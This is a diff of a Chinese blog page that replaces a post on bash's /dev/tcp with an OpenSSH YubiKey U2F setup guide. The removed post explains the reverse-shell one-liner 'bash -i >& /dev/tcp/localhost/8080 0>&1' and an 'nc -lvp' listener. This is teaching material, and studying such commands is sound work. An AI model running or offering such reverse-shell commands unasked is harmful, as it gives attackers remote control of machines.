@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Linux,bash,shell," />
+  <meta name="keywords" content="OpenSSH," />
 
 
 
@@ -81,15 +81,15 @@
 
 
 
-<meta name="description" content="1. 什么是&#x2F;dev&#x2F;tcp&#x2F; &#x2F;dev&#x2F;udp类似 &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port   &#x2F;dev&#x2F;udp&#x2F;host&#x2F;port  这种形式实际上属于bash的一个特性,类似一种固定的格式调用底层函数打开一个socket,在其他的 shell 中并不一定用(ksh 有这种写法)。这是一个特殊的文件实际上在 dev 目录下是不存在的。利用它我们可以创建 TCP&#x2F;UDP 的连接。这里我们举一个例子">
-<meta name="keywords" content="Linux,bash,shell">
+<meta name="description" content="使用 YubiKey u2f 认证方式登录OpenSSH Server前言新版openSSH介绍2020年2月14日，OpenBSD团队 发布了 OpenSSH 8.2，该版本现在支持 FIDO（快速在线身份验证）U2F 安全密钥。OpenSSH 8.2 增加了对通过 FIDO&#x2F;U2F 协议进行身份验证的支持，FIDO(Fast IDentity Online联盟) 是一个基于标准、可互操作的身份">
+<meta name="keywords" content="OpenSSH">
 <meta property="og:type" content="article">
-<meta property="og:title" content="bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;localhost&#x2F;8080 0&gt;&amp;1 的含义">
-<meta property="og:url" content="https:&#x2F;&#x2F;becivells.github.io&#x2F;2019&#x2F;01&#x2F;bash_i_dev_tcp&#x2F;index.html">
+<meta property="og:title" content="使用 YubiKey u2f 认证方式登录OpenSSH Server">
+<meta property="og:url" content="https:&#x2F;&#x2F;becivells.github.io&#x2F;2020&#x2F;03&#x2F;openssh-u2f&#x2F;index.html">
 <meta property="og:site_name" content="Becivells 的 Blog">
-<meta property="og:description" content="1. 什么是&#x2F;dev&#x2F;tcp&#x2F; &#x2F;dev&#x2F;udp类似 &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port   &#x2F;dev&#x2F;udp&#x2F;host&#x2F;port  这种形式实际上属于bash的一个特性,类似一种固定的格式调用底层函数打开一个socket,在其他的 shell 中并不一定用(ksh 有这种写法)。这是一个特殊的文件实际上在 dev 目录下是不存在的。利用它我们可以创建 TCP&#x2F;UDP 的连接。这里我们举一个例子">
+<meta property="og:description" content="使用 YubiKey u2f 认证方式登录OpenSSH Server前言新版openSSH介绍2020年2月14日，OpenBSD团队 发布了 OpenSSH 8.2，该版本现在支持 FIDO（快速在线身份验证）U2F 安全密钥。OpenSSH 8.2 增加了对通过 FIDO&#x2F;U2F 协议进行身份验证的支持，FIDO(Fast IDentity Online联盟) 是一个基于标准、可互操作的身份">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-12-05T05:11:18.627Z">
+<meta property="og:updated_time" content="2020-03-24T01:39:04.012Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="https://becivells.github.io/2019/01/bash_i_dev_tcp/"/>
+  <link rel="canonical" href="https://becivells.github.io/2020/03/openssh-u2f/"/>
 
 
 
 
 
-  <title>bash -i >& /dev/tcp/localhost/8080 0>&1 的含义 | Becivells 的 Blog</title>
+  <title>使用 YubiKey u2f 认证方式登录OpenSSH Server | Becivells 的 Blog</title>
   
 
 
@@ -307,7 +307,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://becivells.github.io/2019/01/bash_i_dev_tcp/">
+    <link itemprop="mainEntityOfPage" href="https://becivells.github.io/2020/03/openssh-u2f/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Becivells">
@@ -324,7 +324,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">bash -i >& /dev/tcp/localhost/8080 0>&1 的含义</h1>
+          <h1 class="post-title" itemprop="name headline">使用 YubiKey u2f 认证方式登录OpenSSH Server</h1>
         
 
         <div class="post-meta">
@@ -336,8 +336,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-03T20:37:04+08:00">
-                2019-01-03
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-24T20:37:04+08:00">
+                2020-03-24
               </time>
             
 
@@ -359,8 +359,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index">
-                    <span itemprop="name">Linux</span>
+                  <a href="/categories/Install/" itemprop="url" rel="index">
+                    <span itemprop="name">Install</span>
                   </a>
                 </span>
 
@@ -390,7 +390,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.1k
+                  1.6k
                 </span>
               
 
@@ -406,7 +406,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  5
+                  6
                 </span>
               
             </div>
@@ -427,49 +427,45 @@
       
 
       
-        <h2 id="1-什么是-dev-tcp-dev-udp"><a href="#1-什么是-dev-tcp-dev-udp" class="headerlink" title="1. 什么是/dev/tcp/ /dev/udp"></a>1. 什么是<code>/dev/tcp/</code> <code>/dev/udp</code></h2><p>类似 <code>/dev/tcp/host/port</code>   <code>/dev/udp/host/port</code>  这种形式实际上属于bash的一个特性,类似一种固定的格式调用底层函数打开一个socket,在其他的 shell 中并不一定用(ksh 有这种写法)。这是一个特殊的文件实际上在 dev 目录下是不存在的。利用它我们可以创建 TCP/UDP 的连接。这里我们举一个例子</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">exec 9&lt;&gt;/dev/tcp/www.hactcm.edu.cn/80   # 打开一个文件描述符 9 并且绑定一个 socket</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">echo -e  "GET / HTTP/1.1/n/n" &gt;&amp;9       # 像 9 中发送一个字符串</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">cat &lt;&amp;9                                 # 取出 9 中收到的字符串</span></pre></td></tr></table></figure>
-<p>结果是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 400 Bad Request</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Content-Type: text&#x2F;html</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Content-Length: 7083</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">.........</span></pre></td></tr></table></figure>
-<p>我们还可以从 <code>/dev/fd/</code>  中看到文件描述符9指向一个socket</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">[root@master ~]# ls -lah /dev/fd/</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">总用量 0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">dr-x------ 2 root root  0 1月   3 21:10 .</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">dr-xr-xr-x 9 root root  0 1月   3 21:10 ..</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 0 -&gt; /dev/pts/0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 1 -&gt; /dev/pts/0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 2 -&gt; /dev/pts/0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">lr-x------ 1 root root 64 1月   3 21:10 3 -&gt; /proc/7597/fd</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 9 -&gt; socket:[34195773]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">[root@master ~]#</span></pre></td></tr></table></figure>
-<p>最后别忘记释放链接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">exec &gt;&amp;9-</span></pre></td></tr></table></figure>
-<p>理解了 <code>/dev/tcp/host/port</code>  的含义我们看一看</p>
-<h2 id="2-理解bash-i-gt-amp-dev-tcp-localhost-8080-0-gt-amp-1"><a href="#2-理解bash-i-gt-amp-dev-tcp-localhost-8080-0-gt-amp-1" class="headerlink" title="2. 理解bash -i &gt;&amp; /dev/tcp/localhost/8080 0&gt;&amp;1"></a>2. 理解<code>bash -i &gt;&amp; /dev/tcp/localhost/8080 0&gt;&amp;1</code></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;localhost&#x2F;8080 0&gt;&amp;1</span></pre></td></tr></table></figure>
-<p>这是一个常用的反弹 shell 的命令。常用于把内网的机器反弹到外网机器上从而实现 外网主机控制内网主机。</p>
-<ul>
-<li><p><code>bash -i</code> 打开一个交互式的shell</p>
+        <h2 id="使用-YubiKey-u2f-认证方式登录OpenSSH-Server"><a href="#使用-YubiKey-u2f-认证方式登录OpenSSH-Server" class="headerlink" title="使用 YubiKey u2f 认证方式登录OpenSSH Server"></a>使用 YubiKey u2f 认证方式登录OpenSSH Server</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="新版openSSH介绍"><a href="#新版openSSH介绍" class="headerlink" title="新版openSSH介绍"></a>新版openSSH介绍</h3><p>2020年2月14日，<a href="https://www.openbsd.org/security.html" target="_blank" rel="noopener">OpenBSD团队</a> 发布了 <a href="https://www.openssh.com/releasenotes.html#8.2" target="_blank" rel="noopener">OpenSSH 8.2</a>，该版本现在支持 FIDO（快速在线身份验证）U2F 安全密钥。OpenSSH 8.2 增加了对通过 FIDO/U2F 协议进行身份验证的支持，FIDO(Fast IDentity Online联盟) 是一个基于标准、可互操作的身份认证生态系统。U2F(Universal 2nd Factor)是FIDO联盟提出的使用标准公钥密码学技术提供更强有力的身份认证协议。<br>  U2F 在常用的用户名/密码的认证基础上又增加了一层第二因子(2nd Factor) 的保护，这重保护是通过物理硬件来支持的。这意味着从今天发布的 OpenSSH 8.2 开始，用户可以在通过 SSH 在远程服务器上进行身份验证时配置硬件安全密钥。</p>
+<p>用户使用他们的用户名密码或 SSH 身份验证证书登录到服务器后，需要提供一个基于 FIDO/U2F 的USB、蓝牙或基于nfc的安全密钥作为第二个身份验证。</p>
+<p>使用安全密钥是目前公认的最强大的多因素身份验证(MFA)方法之一。使用MFA(通常称为2FA(双因素身份验证))是防止黑客猜测或篡改您的SSH密码并控制您的服务器的最简单方法。</p>
+<p>去年，微软表示，该公司为其各自的微软账户启用了MFA的客户阻止了99.9%的账户黑客企图，这表明绕过MFA解决方案是多么困难。微软将基于fido的硬件安全密钥列为最安全、最难破解的MFA解决方案。</p>
+<h3 id="yubikey"><a href="#yubikey" class="headerlink" title="yubikey"></a>yubikey</h3><p>yubikey简单的说是一个硬件认证设备，MFA（Multi-factor authentication），包括2FA（Two-factor authentication），这是一种动态密码认证器，每隔一段时间更新一次验证码，破解理论上来说是不可能的，除非有非常强大的算力。其中这类的软件，包括Goolge身份认证器以及一些其他的（只用过google身份认证器），硬件的话包括我们常见的U盾等，而yubikey就是其中的比较优秀的一款，功能还是挺多的。相关的配置，这个地址有介绍，<a href="https://github.com/iamtwz/yubikey-handbook-chinese" target="_blank" rel="noopener">yubikey入门</a></p>
+<h3 id="OpenSSH-为-u2f-增加的新的秘钥类型"><a href="#OpenSSH-为-u2f-增加的新的秘钥类型" class="headerlink" title="OpenSSH 为 u2f 增加的新的秘钥类型"></a>OpenSSH 为 u2f 增加的新的秘钥类型</h3><p>OpenSSH8.2 添加了的U2F/FIDO支持，U2F被添加为新的密钥类型<a href="mailto:`sk-ecdsa-sha2-nistp256@openssh.com" target="_blank" rel="noopener">`sk-ecdsa-sha2-nistp256@openssh.com</a><code>或者</code>ecdsa-sk`  (“sk” 意思是 “security key”)。由于可以通过多种方式与U2F设备进行通信，包括USB，<br>蓝牙和NFC。OpenSSH开发者不想给OpenSSH负担很多依赖性。相反，他们将与令牌进行通信的任务委托给了一个小型中间件库，该库以类似于现有PKCS＃11支持的方式加载。他们已经为Yubico的libfido2编写了一个基本的中间件，现有的中间件非常基础：它将尝试查找并使用通过USB找到的第一个U2F令牌。因此，如果您恰巧在计算机上附加了多个令牌，则可能会出问题。该中间件能够与任何标准的USB HID U2F或FIDO2令牌对话。中间件源托管在 <a href="https://github.com/Yubico/libfido2" target="_blank" rel="noopener">libfido2</a> 的 GitHub 中。</p>
+<h2 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h2><p>请注意，U2F密钥是新的OpenSSH密钥类型，因此服务器也必须支持它。为了支持 u2f 我们需要客户端和服务端都支持新的秘钥也就是说客户端和服务端OpenSSH版本至少为8.2以上，客户端我们选择macos </p>
+<h3 id="客户端-macOS-10-15-3"><a href="#客户端-macOS-10-15-3" class="headerlink" title="客户端(macOS 10.15.3)"></a>客户端(macOS 10.15.3)</h3><p>客户端需要 <code>libfido2</code> 支持。需要 <code>openSSH 8.2</code> 以上版本 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">brew install libfido2</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">brew install openssh</span></pre></td></tr></table></figure>
+<p>生成 u2f 专用的公私钥文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ecdsa-sk -C &quot;$(hostname)-$(date +&#39;%d-%m-%Y&#39;)-physical_yubikey_number&quot;</span></pre></td></tr></table></figure>
+<p>我们将公钥复制备用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sk-ecdsa-sha2-nistp256@openssh.com AAAAInNrLWVjZHNhLXNoYTItbmlzdHAyNTZAb3BlbnNzaC5jb20AAAAIbmlzdHAyNTYAAABBBBpR&#x2F;DT0N&#x2F;jBjjaSg9ZTGA+9LO9rXe70lpobnn6zovU+QjBy&#x2F;NV&#x2F;UEZRwk3jm38C9ny+fBnTwz07Rz2VtXJDGWMAAAAEc3NoOg&#x3D;&#x3D; dazhuangdeMacBook-Pro.local-23-03-2020-physical_yubikey_number</span></pre></td></tr></table></figure>
+<h3 id="服务器端-OpenBSD-6-6"><a href="#服务器端-OpenBSD-6-6" class="headerlink" title="服务器端(OpenBSD 6.6)"></a>服务器端(OpenBSD 6.6)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"># cd &#x2F;usr&#x2F;src&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"># wget https:&#x2F;&#x2F;cloudflare.cdn.openbsd.org&#x2F;pub&#x2F;OpenBSD&#x2F;OpenSSH&#x2F;portable&#x2F;openssh-8.2p1.tar.gz</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># wget https:&#x2F;&#x2F;ftp.openbsd.org&#x2F;pub&#x2F;OpenBSD&#x2F;OpenSSH&#x2F;openbsd66_8.2.patch</span></pre></td></tr></table></figure>
+<p><strong>编译安装OpenSSH8.2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"># cd &#x2F;usr&#x2F;src&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"># tar zxvf openssh-8.2.tar.gz</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># patch -p1 &lt; &#x2F;path&#x2F;to&#x2F;openbsd66_8.2.patch # if on OpenBSD 6.6 or 6.5</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"># cd ssh</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"># make obj</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"># make cleandir</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"># make depend</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"># make</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"># make install</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"># cp ssh_config sshd_config &#x2F;etc&#x2F;ssh</span></pre></td></tr></table></figure>
+<p><strong>restart sshd</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">kill -HUP &#96;cat &#x2F;var&#x2F;run&#x2F;sshd.pid&#96;</span></pre></td></tr></table></figure>
+<p><strong>配置认证证书</strong></p>
+<p>将id_ecdsa_sk.pub公钥添加到要使用U2F SSH连接到的主机上的authorized_keys文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sshd -V</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">sshd: unknown option -- V</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">OpenSSH_8.2, LibreSSL 3.0.2</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">cat .ssh&#x2F;authorized_keys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">sk-ecdsa-sha2-nistp256@openssh.com AAAAInNrLWVjZHNhLXNoYTItbmlzdHAyNTZAb3BlbnNzaC5jb20AAAAIbmlzdHAyNTYAAABBBBpR&#x2F;DT0N&#x2F;jBjjaSg9ZTGA+9LO9rXe70lpobnn6zovU+QjBy&#x2F;NV&#x2F;UEZRwk3jm38C9ny+fBnTwz07Rz2VtXJDGWMAAAAEc3NoOg&#x3D;&#x3D; dazhuangdeMacBook-Pro.local-23-03-2020-physical_yubikey_number</span></pre></td></tr></table></figure>
+<p><strong>登录过程</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ssh 10.10.50.238</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Confirm user presence for key ECDSA-SK SHA256:ZuitYWD211v1nACCvnP2fJG49jNH7hrDV24ZN2CT748</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Last login: Mon Mar 23 22:48:38 2020 from 10.10.200.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">OpenBSD 6.6 (GENERIC.MP) #372: Sat Oct 12 10:56:27 MDT 2019</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">Welcome to OpenBSD: The proactively secure Unix-like operating system.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">Please use the sendbug(1) utility to report bugs in the system.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">Before reporting a bug, please try to reproduce it with the latest</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">version of the code.  With bug reports, please try to ensure that</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">enough information to reproduce the problem is enclosed, and if a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">known fix for it exists, include that as well.</span></pre></td></tr></table></figure>
+<p>我们甚至可以只接受U2F会话来限制远程堡垒服务器上的SSH身份验证,远程服务器必须支持基于sk的SSH密钥对。需要禁止密码远程登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">[...]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">PubkeyAcceptedKeyTypes sk-ecdsa-sha2-nistp256@openssh.com,sk-ssh-ed25519@openssh.com</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">[...]</span></pre></td></tr></table></figure>
+<h3 id="其他客户端问题"><a href="#其他客户端问题" class="headerlink" title="其他客户端问题"></a>其他客户端问题</h3><p>注意客户端编译时不要忘记安装libfido2-dev并使用所需的–with-security-key-builtin标志编译OpenSSH </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update &amp;&amp; sudo apt-get upgrade -y</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install gcc libssl-dev libcbor-dev zlib* make</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$ sudo apt-add-repository ppa:yubico&#x2F;stable</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update -y</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libfido2-dev</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;usr&#x2F;local&#x2F;src</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;cdn.openbsd.org&#x2F;pub&#x2F;OpenBSD&#x2F;OpenSSH&#x2F;portable&#x2F;openssh-8.2p1.tar.gz</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">$ tar -zxvf openssh-8.2p1.tar.gz</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;openssh-8.2p1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">$ .&#x2F;configure --prefix&#x3D;&#x2F;usr --with-security-key-builtin</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">$ make &amp;&amp; make install</span></pre></td></tr></table></figure>
+<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ol>
+<li><p><a href="https://cryptsus.com/blog/how-to-configure-openssh-with-yubikey-security-keys-u2f-otp-authentication-ed25519-sk-ecdsa-sk-on-ubuntu-18.04.html" target="_blank" rel="noopener">How to configure OpenSSH with YubiKey Security Keys U2F Authentication on Ubuntu 18.04</a></p>
 </li>
-<li><p><code>&gt;&amp;</code>  这个命令和 <code>&amp;&gt;</code> 是一样的而且我推荐大家使用 <code>&amp;&gt;</code> 。这两个符号的含义是把标准错误和标准输出重定向到文件。举个例子大家可以执行以下看一下结果</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ls -la &gt; aaa.log    # 标准输出重定向到文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">cat aaa.log         # 查看结果</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">lss -la &gt; aaa.log   # 标准错误未重定向到文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">cat aaa.log         # 查看结果</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">lss -la &amp;&gt; aaa.log  # 标准错误和标准输出未重定向到文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">cat aaa.log </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">lss -la &gt;&amp; aaa.log  # 标准错误和标准输出未重定向到文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">cat aaa.log         # 查看结果</span></pre></td></tr></table></figure>
-<p>对于这个<code>&gt;&amp;</code>  <code>&amp;&gt;</code> 的解释可以看<a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Redirecting-Standard-Output-and-Standard-Error" target="_blank" rel="noopener">bash的手册</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be redirected to the file whose name is the expansion of word.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">There are two formats for redirecting standard output and standard error:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&amp;&gt;word</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">and</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&gt;&amp;word</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">Of the two forms, the first is preferred. This is semantically equivalent to</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&gt;word 2&gt;&amp;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">When using the second form, word may not expand to a number or ‘-’. If it does, other redirection operators apply (see Duplicating File Descriptors below) for compatibility reasons.</span></pre></td></tr></table></figure>
-<p><strong>一句话说就是这两个符号代表的含义是一样的</strong></p>
+<li><p><a href="https://marc.info/?l=openssh-unix-dev&amp;m=157259802529972&amp;w=2" target="_blank" rel="noopener">U2F support in OpenSSH HEAD</a></p>
 </li>
-<li><p><code>0&gt;&amp;1</code> 把输入重定向到标准输出</p>
+<li><p><a href="https://news.ycombinator.com/item?id=21417182" target="_blank" rel="noopener">U2F Support in OpenSSH Head (marc.info)</a></p>
 </li>
-</ul>
-<p><strong>这样外网的机器就可以获得一个完整的 shell </strong>,有兴趣的大家可以试一下</p>
-<h2 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h2><p>外网机器执行 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">nc -lvp 8787</span></pre></td></tr></table></figure>
-<p>内网机器执行</p>
